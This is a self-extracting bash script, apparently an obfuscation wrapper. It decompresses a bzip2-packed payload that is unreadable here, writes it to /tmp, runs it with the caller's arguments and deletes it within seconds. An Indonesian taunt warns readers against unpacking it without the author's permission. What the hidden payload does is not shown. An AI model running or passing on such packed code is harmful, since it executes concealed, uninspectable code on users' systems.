#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY˽�! 3�}� �����������PT@   �P�K6�;�X�	DA5=1	��M����Fi�M��zOQ�'��G� ID�M��Dچ�z�P��@ @   4 $�ESؚ����jjzF514�d1�M�& 8 �2��� ��� $Jd	��5Oҍꞧ�Q��=A�@z�j� � �;#A	�(��A���1�ԯҏ���:��>�o��䒲���� ��}�S���E.*�g�R�!�$�_t����r��*H�Y��ɾjP�ߌp6E��q�r�ڃU8^fCʪ�H�aR��(�H���	F����ذG���3�c����k��У^�4EйƔ�}�Ә����>�-Vf��j��C7]�x����Ӵ݋Zi|��w�Q�k�[��{�ZQ���iغ$�;5l�? }�CX�uW�]�"�,c�O�Qm�ft�p��V^ب�:Vy��C6�+\��H)����>jh�����*�P�$�g��¼���U��s��+��|������腒+,f�x� _;ni�F�j��Ad���љ�iw�0+R��F%�.(����-esHXqbZ[���� �j�+�abQ���@�F�S��$�6Y���"J���b�#r��������<��S��D�=�����Q<��F���s��д���3t�ϝ݉��͝�P���7��v����STD��!ҫ�<���1�8X�e�nς�Z�n��+���1��*	咉E��f�A
Q ���@�blH�u��pW�gS!w+'�{%�.̏:g����/U�Mn�t�r��o��<BC�YQUTA1�/��m��2ncrܨ䄈݊f�H�!�P�1���s-E���� ⅺ��F)".4�l�!�����H��K})��&�C`6:�i3H�+\e��*���c�uST�2�r�����<+��z�d��՟NT�,��O��p*)ސ0h�U&cC:�k/����$�p4�I`{81�e�P������ǇJH��Ѵm���I�"Է�o��pa�f�T�P��;bg�T,1�1�be@tS��4�>��oт�}x��QWU�
í��R���h���9�ʃ-� ���'�Kb_e}�鰊����2��q�+�kJaα"�LX�t
X�D�g���o��P~�J�Q������1+��Z�&�!�������.؀еS�-qz�J�R�8'�%#X�\�
Q�e5�'���>Bt����X	$�%Ҵ�XvǤ#X�Fp�E,�yV.���ǵ��!#%��&�%p�Ho(�����(�s�A��PPQM,W��:IF������i3%��u�Pb(25pF鸤��X'�F�VJ��r)R�p�ֲL�Oe�Q�F�4^�Ns���i!�%E��pNaN� �ܩ�s�(���20`�-&��{�)���*�>��.	������
FW)8�J1-��q%��vIe��A����>��Bh		�H]�h�	�L;:�I �&1����)�]�!